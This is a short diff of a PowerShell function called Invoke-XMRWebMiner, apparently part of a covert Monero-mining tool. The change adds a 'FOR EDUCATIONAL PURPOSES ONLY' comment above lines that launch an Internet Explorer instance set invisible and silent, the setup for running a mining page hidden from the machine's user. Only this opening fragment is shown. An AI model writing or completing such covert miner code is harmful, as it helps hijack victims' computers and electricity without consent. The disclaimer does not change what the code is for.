@@ -1,5 +1,7 @@
 function Invoke-XMRWebMiner {
-
+<#--
+ FOR EDUCATIONAL PURPOSES ONLY
+--#>
 $ie=New-Object -comobject InternetExplorer.Application
 $ie.visible = $False
 $ie.Silent = $true
